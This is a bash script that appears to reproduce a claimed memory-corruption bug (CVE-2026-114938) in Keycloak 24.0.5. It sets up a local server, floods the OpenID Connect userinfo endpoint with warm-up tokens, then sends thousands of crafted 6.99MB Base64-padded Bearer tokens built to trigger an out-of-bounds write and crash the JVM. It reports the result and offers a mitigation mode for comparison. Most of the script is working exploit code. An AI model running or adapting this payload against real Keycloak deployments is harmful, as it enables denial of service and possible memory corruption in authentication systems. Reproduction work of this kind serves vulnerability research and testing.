#!/bin/bash
# Keycloak + CVE-2026-114938 OOB flood — app-level reproduction
# usage: keycloak_oob_flood.sh <mode: vuln|mitig>
set -ux
MODE="${1:-vuln}"

export DEBIAN_FRONTEND=noninteractive
apt-get update -qq >/dev/null 2>&1
apt-get install -y -qq curl wget procps >/dev/null 2>&1

cd /opt
wget -q https://github.com/keycloak/keycloak/releases/download/24.0.5/keycloak-24.0.5.tar.gz
tar xzf keycloak-24.0.5.tar.gz

KC_FLAGS="-Xms1g -Xmx1g -XX:+UnlockExperimentalVMOptions -XX:G1HeapRegionSize=1m -Xlog:gc:file=/tmp/kc-gc.log"
if [ "$MODE" = "mitig" ]; then KC_FLAGS="$KC_FLAGS -XX:-UseBASE64Intrinsics"; fi

echo "═══ Keycloak 24.0.5 starting (mode=$MODE, flags=$KC_FLAGS) ═══"
java -XX:+PrintFlagsFinal -version 2>&1 | grep -i base64 || true
JAVA_HOME=/opt/java/openjdk \
  /opt/keycloak-24.0.5/bin/kc.sh start-dev -Dkc.opts="$KC_FLAGS" \
  --http-port=8080 > /tmp/kc.log 2>&1 &
KCPID=$!
# kc.sh may spawn child; track the JVM process group loosely — poll for the java pid
sleep 5
JPID=$(pgrep -f 'keycloak' | head -1)
[ -n "$JPID" ] || JPID=$KCPID
echo "JVM pid: $JPID"

UP=0
for i in $(seq 1 60); do
  if curl -s -o /dev/null -m 3 http://127.0.0.1:8080/; then UP=1; break; fi
  sleep 5
done
[ "$UP" = "1" ] || { echo "KEYCLOAK FAILED TO START"; tail -50 /tmp/kc.log; exit 1; }
echo "Keycloak up ($(date)) — JVM pid $JPID"

URL="http://127.0.0.1:8080/realms/master/protocol/openid-connect/userinfo"

# warm decode0 with valid-format (unpadded) tokens
WARM=$(printf 'A%.0s' $(seq 1 300))
WT="${WARM}.${WARM}.${WARM}"
echo "[warm] 15000 requests..."
for i in $(seq 1 15000); do
  curl -s -o /dev/null -m 5 -H "Authorization: Bearer $WT" "$URL" &
  if [ $((i % 64)) = 0 ]; then wait; fi
  if ! kill -0 "$JPID" 2>/dev/null; then echo "CRASH DURING WARMUP at $i"; break; fi
done
wait
echo "[warm] done — JVM alive: $(kill -0 "$JPID" 2>/dev/null && echo yes || echo NO)"

# crafted token: header part "A"*(4k) + "==" → stub final-bit r=2, 62B OOB write
CRAFT="$(head -c 6990464 /dev/zero | tr '\0' 'A')=="
CRAFT="${CRAFT}.AAAA.${WARM}"
echo "[flood] crafted 6.99MB padded tokens..."

CRASH=0
for i in $(seq 1 3000); do
  curl -s -o /dev/null -m 10 -H "Authorization: Bearer $CRAFT" "$URL"
  if ! kill -0 "$JPID" 2>/dev/null; then
    echo "★★★ JVM CRASHED at flood iteration $i ★★★"
    CRASH=1
    break
  fi
  if [ $((i % 100)) = 0 ]; then
    RSS=$(ps -o rss= -p "$JPID" 2>/dev/null | tr -d ' ')
    echo "[flood] i=$i alive rss=${RSS}KB"
  fi
done

if [ "$CRASH" = "1" ]; then
  echo "── JVM dead. log tail: ──"
  tail -60 /tmp/kc.log
  ls /opt/keycloak-24.0.5/hs_err* /hs_err* /tmp/hs_err* 2>/dev/null || echo "(no hs_err file found)"
  for f in $(ls /opt/keycloak-24.0.5/hs_err* 2>/dev/null | head -1); do
    echo "── hs_err head: ──"; head -40 "$f"
  done
  echo "VERDICT: APP-CRASH-OBSERVED (mode=$MODE)"
  exit 42
else
  echo "── JVM survived 3000 crafted floods ──"
  tail -20 /tmp/kc.log
  echo "VERDICT: NO-CRASH (mode=$MODE)"
  exit 0
fi
